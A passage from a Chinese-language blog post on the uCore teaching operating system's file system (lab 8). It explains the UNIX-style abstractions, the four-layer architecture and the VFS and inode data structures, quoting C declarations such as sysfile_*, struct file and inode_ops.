<p><img src="/2020/09/uCore-8/raid10.png" alt="img"></p>
</li>
</ul>
<h3 id="9-uCore文件系统实现">9. uCore文件系统实现</h3>
<h4 id="a-uCore文件系统概述">a. uCore文件系统概述</h4>
<p>操作系统中负责管理和存储可长期保存数据的软件功能模块称为文件系统。在本次试验中，主要侧重文件系统的设计实现和对文件系统执行流程的分析与理解。</p>
<p>ucore的文件系统模型源于Havard的OS161的文件系统和Linux文件系统。但其实这二者都是源于传统的UNIX文件系统设计。UNIX提出了四个文件系统抽象概念：文件(file)、目录项(dentry)、索引节点(inode)和安装点(mount point)。</p>
<ul>
<li><strong>文件</strong>：UNIX文件中的内容可理解为是一有序字节buffer，文件都有一个方便应用程序识别的文件名称（也称文件路径名）。典型的文件操作有读、写、创建和删除等。</li>
<li><strong>目录项</strong>：目录项不是目录（又称文件路径），而是目录的组成部分。在UNIX中目录被看作一种特定的文件，而目录项是文件路径中的一部分。如一个文件路径名是“/test/testfile”，则包含的目录项为：根目录“/”，目录“test”和文件“testfile”，这三个都是目录项。一般而言，目录项包含目录项的名字（文件名或目录名）和目录项的索引节点（见下面的描述）位置。</li>
<li><strong>索引节点</strong>：UNIX将文件的相关元数据信息（如访问控制权限、大小、拥有者、创建时间、数据内容等等信息）存储在一个单独的数据结构中，该结构被称为索引节点。</li>
<li><strong>安装点</strong>：在UNIX中，文件系统被安装在一个特定的文件路径位置，这个位置就是安装点。所有的已安装文件系统都作为根文件系统树中的叶子出现在系统中。</li>
</ul>
<p>上述抽象概念形成了UNIX文件系统的逻辑数据结构，并需要通过一个具体文件系统的架构设计与实现把上述信息映射并储存到磁盘介质上，从而在具体文件系统的磁盘布局（即数据在磁盘上的物理组织）上具体体现出上述抽象概念。</p>
<blockquote>
<p>比如文件元数据信息存储在磁盘块中的索引节点上。当文件被载入内存时，内核需要使用磁盘块中的索引点来构造内存中的索引节点。</p>
</blockquote>
<p>ucore模仿了UNIX的文件系统设计，ucore的文件系统架构主要由四部分组成：</p>
<ul>
<li><strong>通用文件系统访问接口层</strong>：该层提供了一个从用户空间到文件系统的标准访问接口。这一层访问接口让应用程序能够通过一个简单的接口获得ucore内核的文件系统服务。</li>
<li><strong>文件系统抽象层</strong>：向上提供一个一致的接口给内核其他部分（文件系统相关的系统调用实现模块和其他内核功能模块）访问。向下提供一个同样的抽象函数指针列表和数据结构屏蔽不同文件系统的实现细节。</li>
<li><strong>Simple FS文件系统层</strong>：一个基于索引方式的简单文件系统实例。向上通过各种具体函数实现以对应文件系统抽象层提出的抽象函数。向下访问外设接口</li>
<li><strong>外设接口层</strong>：向上提供device访问接口屏蔽不同硬件细节。向下实现访问各种具体设备驱动的接口，比如disk设备接口/串口设备接口/键盘设备接口等。</li>
</ul>
<p>对照上面的层次我们再大致介绍一下文件系统的访问处理过程，加深对文件系统的总体理解。假如应用程序操作文件（打开/创建/删除/读写），首先需要通过文件系统的通用文件系统访问接口层给用户空间提供的访问接口进入文件系统内部，接着由文件系统抽象层把访问请求转发给某一具体文件系统（比如SFS文件系统），具体文件系统（Simple FS文件系统层）把应用程序的访问请求转化为对磁盘上的block的处理请求，并通过外设接口层交给磁盘驱动例程来完成具体的磁盘操作。结合用户态写文件函数write的整个执行过程，我们可以比较清楚地看出ucore文件系统架构的层次和依赖关系。</p>
<p><img src="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab8_figs/image001.png" alt="image"></p>
<p><strong>ucore文件系统总体结构</strong></p>
<p>从ucore操作系统不同的角度来看，ucore中的文件系统架构包含四类主要的数据结构, 它们分别是：</p>
<ul>
<li><strong>超级块（SuperBlock）</strong>，它主要从文件系统的全局角度描述特定文件系统的全局信息。它的作用范围是整个OS空间。</li>
<li><strong>索引节点（inode）</strong>：它主要从文件系统的单个文件的角度它描述了文件的各种属性和数据所在位置。它的作用范围是整个OS空间。</li>
<li><strong>目录项（dentry）</strong>：它主要从文件系统的文件路径的角度描述了文件路径中的一个特定的目录项（注：一系列目录项形成目录/文件路径）。它的作用范围是整个OS空间。对于SFS而言，inode(具体为struct sfs_disk_inode)对应于物理磁盘上的具体对象，dentry（具体为struct sfs_disk_entry）是一个内存实体，其中的ino成员指向对应的inode number，另外一个成员是file name(文件名).</li>
<li><strong>文件（file）</strong>，它主要从进程的角度描述了一个进程在访问文件时需要了解的文件标识，文件读写的位置，文件引用情况等信息。它的作用范围是某一具体进程。</li>
</ul>
<p>如果一个用户进程打开了一个文件，那么在ucore中涉及的相关数据结构（其中相关数据结构将在下面各个小节中展开叙述）和关系如下图所示：</p>
<p><img src="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab8_figs/image002.png" alt="image"></p>
<p>先上一张相关数据结构的关联图</p>
<blockquote>
<p>自己画的太丑了T_T，该图来源<a href="http://www.resery.top/" target="_blank" rel="noopener">resery</a></p>
</blockquote>
<p><img src="/2020/09/uCore-8/fsStruct.png" alt="img"></p>
<p>文件系统整体结构</p>
<p><img src="/2020/09/uCore-8/total_struct.png" alt="img"></p>
<p>我们先从上到下分析一下结构</p>
<h4 id="b-文件系统结构">b. 文件系统结构</h4>
<h5 id="1-通用文件系统访问接口层">1) 通用文件系统访问接口层</h5>
<p>在内核中，通用的文件相关的函数分别是以下这些函数，同时也是我们在uCore中最常使用的函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags)</span></span>;        <span class="comment">// Open or create a file. FLAGS/MODE per the syscall.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;                                      <span class="comment">// Close a vnode opened  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len)</span></span>;               <span class="comment">// Read file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len)</span></span>;              <span class="comment">// Write file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_seek</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> pos, <span class="keyword">int</span> whence)</span></span>;                <span class="comment">// Seek file  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_fstat</span><span class="params">(<span class="keyword">int</span> fd, struct stat *stat)</span></span>;                   <span class="comment">// Stat file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_fsync</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;                                      <span class="comment">// Sync file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_chdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span>;                            <span class="comment">// change DIR  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_mkdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span>;                            <span class="comment">// create DIR</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_link</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path1, <span class="keyword">const</span> <span class="keyword">char</span> *path2)</span></span>;         <span class="comment">// set a path1's link as path2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_rename</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path1, <span class="keyword">const</span> <span class="keyword">char</span> *path2)</span></span>;       <span class="comment">// rename file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_unlink</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span>;                           <span class="comment">// unlink a path</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_getcwd</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span>;                      <span class="comment">// get current working directory</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_getdirentry</span><span class="params">(<span class="keyword">int</span> fd, struct dirent *direntp)</span></span>;        <span class="comment">// get the file entry in DIR</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_dup</span><span class="params">(<span class="keyword">int</span> fd1, <span class="keyword">int</span> fd2)</span></span>;                              <span class="comment">// duplicate file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_pipe</span><span class="params">(<span class="keyword">int</span> *fd_store)</span></span>;                                <span class="comment">// build PIPE</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysfile_mkfifo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint32_t</span> open_flags)</span></span>;      <span class="comment">// build named PIPE</span></span><br></pre></td></tr></table></figure>
<p>在这些<code>sysfile_xx</code>函数中，调用的下一层函数分别是封装好的各个<code>file_xx</code>函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_open</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len, <span class="keyword">size_t</span> *copied_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len, <span class="keyword">size_t</span> *copied_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_seek</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> pos, <span class="keyword">int</span> whence)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_fstat</span><span class="params">(<span class="keyword">int</span> fd, struct stat *stat)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_fsync</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_getdirentry</span><span class="params">(<span class="keyword">int</span> fd, struct dirent *dirent)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_dup</span><span class="params">(<span class="keyword">int</span> fd1, <span class="keyword">int</span> fd2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_pipe</span><span class="params">(<span class="keyword">int</span> fd[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_mkfifo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint32_t</span> open_flags)</span></span>;</span><br></pre></td></tr></table></figure>
<p>通常来讲，这些函数都会操作当前进程访问文件的数据接口，即<code>current-&gt;filesp</code>。该<code>struct files_struct</code>结构如下所示</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * process's file related informaction</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">pwd</span>;</span>      <span class="comment">// inode of present working directory</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fd_array</span>;</span>  <span class="comment">// opened files array</span></span><br><span class="line">    <span class="keyword">int</span> files_count;        <span class="comment">// the number of opened files</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> files_sem;  <span class="comment">// lock protect sem</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构中包含了当前进程的工作路径、所打开的文件数组集合以及信号量等。</p>
<p>在<code>fd_array</code>数组中，每个进程打开的文件所对应的索引，就是该文件在该进程所对应的文件描述符。</p>
<blockquote>
<p>即不同进程打开文件时，返回的文件描述符可能时是不一样的。</p>
</blockquote>
<h5 id="2-文件系统抽象层-VFS">2) 文件系统抽象层(VFS)</h5>
<h6 id="VFS接口与数据结构">VFS接口与数据结构</h6>
<blockquote>
<p>文件系统抽象层是把不同文件系统的对外共性接口提取出来，形成一个函数指针数组，这样，通用文件系统访问接口层只需访问文件系统抽象层，而不需关心具体文件系统的实现细节和接口。</p>
</blockquote>
<p>系统接口再下一层就到了<code>VFS</code>虚拟文件系统。VFS函数涉及到了文件结构<code>struct file</code>。该结构体指定了文件的相关类型，包括读写权限，文件描述符<code>fd</code>，当前读取到的位置<code>pos</code>，文件系统中与硬盘特定区域所对应的结点<code>node</code>，以及打开的引用次数<code>open_count</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">        FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,</span><br><span class="line">    &#125; status;</span><br><span class="line">    <span class="keyword">bool</span> readable;</span><br><span class="line">    <span class="keyword">bool</span> writable;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">off_t</span> pos; <span class="comment">// 下一次写入的起始位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">int</span> open_count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>虚拟文件系统中，所使用的相关函数接口分别是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Virtual File System layer functions.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The VFS layer translates operations on abstract on-disk files or</span></span><br><span class="line"><span class="comment"> * pathnames to operations on specific files on specific filesystems.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vfs_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vfs_cleanup</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vfs_devlist_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VFS layer low-level operations.</span></span><br><span class="line"><span class="comment"> * See inode.h for direct operations on inodes.</span></span><br><span class="line"><span class="comment"> * See fs.h for direct operations on filesystems/devices.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_set_curdir   - change current directory of current thread by inode</span></span><br><span class="line"><span class="comment"> *    vfs_get_curdir   - retrieve inode of current directory of current thread</span></span><br><span class="line"><span class="comment"> *    vfs_get_root     - get root inode for the filesystem named DEVNAME</span></span><br><span class="line"><span class="comment"> *    vfs_get_devname  - get mounted device name for the filesystem passed in</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_set_curdir</span><span class="params">(struct inode *dir)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_get_curdir</span><span class="params">(struct inode **dir_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_get_root</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, struct inode **root_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">vfs_get_devname</span><span class="params">(struct fs *fs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VFS layer high-level operations on pathnames</span></span><br><span class="line"><span class="comment"> * Because namei may destroy pathnames, these all may too.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_open         - Open or create a file. FLAGS/MODE per the syscall.</span></span><br><span class="line"><span class="comment"> *    vfs_close  - Close a inode opened with vfs_open. Does not fail.</span></span><br><span class="line"><span class="comment"> *                 (See vfspath.c for a discussion of why.)</span></span><br><span class="line"><span class="comment"> *    vfs_link         - Create a hard link to a file.</span></span><br><span class="line"><span class="comment"> *    vfs_symlink      - Create a symlink PATH containing contents CONTENTS.</span></span><br><span class="line"><span class="comment"> *    vfs_readlink     - Read contents of a symlink into a uio.</span></span><br><span class="line"><span class="comment"> *    vfs_mkdir        - Create a directory. MODE per the syscall.</span></span><br><span class="line"><span class="comment"> *    vfs_unlink       - Delete a file/directory.</span></span><br><span class="line"><span class="comment"> *    vfs_rename       - rename a file.</span></span><br><span class="line"><span class="comment"> *    vfs_chdir  - Change current directory of current thread by name.</span></span><br><span class="line"><span class="comment"> *    vfs_getcwd - Retrieve name of current directory of current thread.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_open</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags, struct inode **inode_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_close</span><span class="params">(struct inode *node)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_link</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_symlink</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_readlink</span><span class="params">(<span class="keyword">char</span> *path, struct iobuf *iob)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_mkdir</span><span class="params">(<span class="keyword">char</span> *path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_unlink</span><span class="params">(<span class="keyword">char</span> *path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_rename</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_chdir</span><span class="params">(<span class="keyword">char</span> *path)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_getcwd</span><span class="params">(struct iobuf *iob)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VFS layer mid-level operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_lookup     - Like VOP_LOOKUP, but takes a full device:path name,</span></span><br><span class="line"><span class="comment"> *                     or a name relative to the current directory, and</span></span><br><span class="line"><span class="comment"> *                     goes to the correct filesystem.</span></span><br><span class="line"><span class="comment"> *    vfs_lookparent - Likewise, for VOP_LOOKPARENT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Both of these may destroy the path passed in.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_lookup</span><span class="params">(<span class="keyword">char</span> *path, struct inode **node_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_lookup_parent</span><span class="params">(<span class="keyword">char</span> *path, struct inode **node_store, <span class="keyword">char</span> **endp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Misc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_set_bootfs - Set the filesystem that paths beginning with a</span></span><br><span class="line"><span class="comment"> *                    slash are sent to. If not set, these paths fail</span></span><br><span class="line"><span class="comment"> *                    with ENOENT. The argument should be the device</span></span><br><span class="line"><span class="comment"> *                    name or volume name for the filesystem (such as</span></span><br><span class="line"><span class="comment"> *                    "lhd0:") but need not have the trailing colon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_get_bootfs - return the inode of the bootfs filesystem.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_add_fs     - Add a hardwired filesystem to the VFS named device</span></span><br><span class="line"><span class="comment"> *                    list. It will be accessible as "devname:". This is</span></span><br><span class="line"><span class="comment"> *                    intended for filesystem-devices like emufs, and</span></span><br><span class="line"><span class="comment"> *                    gizmos like Linux procfs or BSD kernfs, not for</span></span><br><span class="line"><span class="comment"> *                    mounting filesystems on disk devices.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_add_dev    - Add a device to the VFS named device list. If</span></span><br><span class="line"><span class="comment"> *                    MOUNTABLE is zero, the device will be accessible</span></span><br><span class="line"><span class="comment"> *                    as "DEVNAME:". If the mountable flag is set, the</span></span><br><span class="line"><span class="comment"> *                    device will be accessible as "DEVNAMEraw:" and</span></span><br><span class="line"><span class="comment"> *                    mountable under the name "DEVNAME". Thus, the</span></span><br><span class="line"><span class="comment"> *                    console, added with MOUNTABLE not set, would be</span></span><br><span class="line"><span class="comment"> *                    accessed by pathname as "con:", and lhd0, added</span></span><br><span class="line"><span class="comment"> *                    with mountable set, would be accessed by</span></span><br><span class="line"><span class="comment"> *                    pathname as "lhd0raw:" and mounted by passing</span></span><br><span class="line"><span class="comment"> *                    "lhd0" to vfs_mount.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_mount      - Attempt to mount a filesystem on a device. The</span></span><br><span class="line"><span class="comment"> *                    device named by DEVNAME will be looked up and</span></span><br><span class="line"><span class="comment"> *                    passed, along with DATA, to the supplied function</span></span><br><span class="line"><span class="comment"> *                    MOUNTFUNC, which should create a struct fs and</span></span><br><span class="line"><span class="comment"> *                    return it in RESULT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_unmount    - Unmount the filesystem presently mounted on the</span></span><br><span class="line"><span class="comment"> *                    specified device.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    vfs_unmountall - Unmount all mounted filesystems.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_set_bootfs</span><span class="params">(<span class="keyword">char</span> *fsname)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_get_bootfs</span><span class="params">(struct inode **node_store)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_add_fs</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_add_dev</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, struct inode *devnode, <span class="keyword">bool</span> mountable)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_mount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, <span class="keyword">int</span> (*mountfunc)(struct device *dev, struct fs **fs_store))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_unmount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_unmount_all</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vfs中更为底层的函数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vop_magic;</span><br><span class="line">    <span class="keyword">int</span> (*vop_open)(struct inode *node, <span class="keyword">uint32_t</span> open_flags);</span><br><span class="line">    <span class="keyword">int</span> (*vop_close)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);</span><br><span class="line">    <span class="keyword">int</span> (*vop_fsync)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_reclaim)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_gettype)(struct inode *node, <span class="keyword">uint32_t</span> *type_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="keyword">off_t</span> pos);</span><br><span class="line">    <span class="keyword">int</span> (*vop_truncate)(struct inode *node, <span class="keyword">off_t</span> len);</span><br><span class="line">    <span class="keyword">int</span> (*vop_create)(struct inode *node, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> excl, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_lookup)(struct inode *node, <span class="keyword">char</span> *path, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="keyword">int</span> op, <span class="keyword">void</span> *data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="inode接口">inode接口</h6>
<p><code>vfs</code>会涉及到<code>inode</code>结构的操作，该结构是位于内存的索引节点，它是VFS结构中的重要数据结构，因为它实际负责把不同文件系统的特定索引节点信息（甚至不能算是一个索引节点）统一封装起来，避免了进程直接访问具体文件系统。其定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A struct inode is an abstract representation of a file.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * It is an interface that allows the kernel's filesystem-independent</span></span><br><span class="line"><span class="comment"> * code to interact usefully with multiple sets of filesystem code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Abstract low-level file.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note: in_info is Filesystem-specific data, in_type is the inode type</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * open_count is managed using VOP_INCOPEN and VOP_DECOPEN by</span></span><br><span class="line"><span class="comment"> * vfs_open() and vfs_close(). Code above the VFS layer should not</span></span><br><span class="line"><span class="comment"> * need to worry about it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="comment">// 设备结点</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device</span> __<span class="title">device_info</span>;</span></span><br><span class="line">        <span class="comment">// 对应文件系统中，文件/目录的实际节点</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> __<span class="title">sfs_inode_info</span>;</span></span><br><span class="line">    &#125; in_info;</span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">        inode_type_device_info = <span class="number">0x1234</span>,</span><br><span class="line">        inode_type_sfs_inode_info,</span><br><span class="line">    &#125; in_type;</span><br><span class="line">    <span class="keyword">int</span> ref_count;</span><br><span class="line">    <span class="keyword">int</span> open_count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">in_fs</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> *<span class="title">in_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>struct inode</code>中存放了<code>info</code>、类型<code>type</code>、引用次数<code>ref_count</code>、打开次数<code>open_count</code>、相关联的文件系统<code>in_fs</code>以及当前结构所对应的操作集合<code>in_ops</code>。该结构与硬盘上对应区域相关联，从而便于对硬盘进行操作。</p>
<p><code>inode_ops</code>成员是对常规文件、目录、设备文件所有操作的一个抽象函数表示。对于某一具体的文件系统中的文件或目录，只需实现相关的函数，就可以被用户进程访问具体的文件了，且用户进程无需了解具体文件系统的实现细节。可选实现如下：</p>
